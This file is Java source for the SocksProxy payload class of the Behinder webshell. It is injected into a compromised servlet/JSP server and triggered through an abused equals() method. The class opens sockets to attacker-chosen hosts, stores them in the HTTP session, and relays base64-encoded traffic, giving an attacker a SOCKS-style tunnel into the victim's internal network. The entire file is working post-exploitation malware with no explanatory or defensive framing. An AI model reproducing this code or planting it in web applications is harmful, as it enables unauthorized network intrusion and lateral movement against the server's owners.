package net.rebeyond.behinder.payload.java;

import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.UnknownHostException;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;
import javax.servlet.ServletOutputStream;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.PageContext;

public class SocksProxy {
   public static String cmd;
   public static String targetIP;
   public static String targetPort;
   public static String socketHash;
   public static String extraData;

   public static void main(String[] args) {
   }

   public boolean equals(Object obj) {
      PageContext page = (PageContext)obj;

      try {
         this.proxy(page);
      } catch (Exception var4) {
      }

      return true;
   }

   public void proxy(PageContext page) throws Exception {
      HttpServletRequest request = (HttpServletRequest)page.getRequest();
      HttpServletResponse response = (HttpServletResponse)page.getResponse();
      HttpSession session = page.getSession();
      if (cmd != null) {
         if (cmd.compareTo("CONNECT") == 0) {
            ServletOutputStream so;
            try {
               String target = targetIP;
               int port = Integer.parseInt(targetPort);
               SocketChannel socketChannel = SocketChannel.open();
               socketChannel.connect(new InetSocketAddress(target, port));
               socketChannel.configureBlocking(false);
               session.setAttribute("socket_" + socketHash, socketChannel);
               response.setStatus(200);
            } catch (UnknownHostException var10) {
               so = response.getOutputStream();
               so.write(new byte[]{55, 33, 73, 54});
               so.write(var10.getMessage().getBytes());
               so.flush();
               so.close();
            } catch (IOException var11) {
               so = response.getOutputStream();
               so.write(new byte[]{55, 33, 73, 54});
               so.write(var11.getMessage().getBytes());
               so.flush();
               so.close();
            }
         } else {
            SocketChannel socketChannel;
            if (cmd.compareTo("DISCONNECT") == 0) {
               socketChannel = (SocketChannel)session.getAttribute("socket_" + socketHash);

               try {
                  socketChannel.socket().close();
               } catch (Exception var9) {
                  var9.printStackTrace();
               }

               session.removeAttribute("socket_" + socketHash);
            } else {
               ServletOutputStream so = null;
               if (cmd.compareTo("READ") == 0) {
                  socketChannel = (SocketChannel)session.getAttribute("socket_" + socketHash);

                  try {
                     ByteBuffer buf = ByteBuffer.allocate(512);
                     int bytesRead = socketChannel.read(buf);

                     for(so = response.getOutputStream(); bytesRead > 0; bytesRead = socketChannel.read(buf)) {
                        so.write(buf.array(), 0, bytesRead);
                        so.flush();
                        buf.clear();
                     }

                     so.flush();
                     so.close();
                  } catch (Exception var13) {
                     response.setStatus(200);
                     so = response.getOutputStream();
                     so.write(new byte[]{55, 33, 73, 54});
                     so.write(var13.getMessage().getBytes());
                     so.flush();
                     so.close();
                     page.getOut().clear();
                     socketChannel.socket().close();
                     var13.printStackTrace();
                  }
               } else if (cmd.compareTo("FORWARD") == 0) {
                  socketChannel = (SocketChannel)session.getAttribute("socket_" + socketHash);

                  try {
                     byte[] extraDataByte = this.base64decode(extraData);
                     ByteBuffer buf = ByteBuffer.allocate(extraDataByte.length);
                     buf.clear();
                     buf.put(extraDataByte);
                     buf.flip();

                     while(buf.hasRemaining()) {
                        socketChannel.write(buf);
                     }
                  } catch (Exception var12) {
                     so = response.getOutputStream();
                     so.write(new byte[]{55, 33, 73, 54});
                     so.write(var12.getMessage().getBytes());
                     so.flush();
                     so.close();
                     socketChannel.socket().close();
                  }
               }
            }
         }
      }

      page.getOut().clear();
   }

   private byte[] base64decode(String text) throws Exception {
      String version = System.getProperty("java.version");
      byte[] result = null;

      try {
         Class Base64;
         Object Decoder;
         if (version.compareTo("1.9") >= 0) {
            this.getClass();
            Base64 = Class.forName("java.util.Base64");
            Decoder = Base64.getMethod("getDecoder", (Class[])null).invoke(Base64, (Object[])null);
            result = (byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, text);
         } else {
            this.getClass();
            Base64 = Class.forName("sun.misc.BASE64Decoder");
            Decoder = Base64.newInstance();
            result = (byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, text);
         }
      } catch (Exception var6) {
      }

      return result;
   }
}
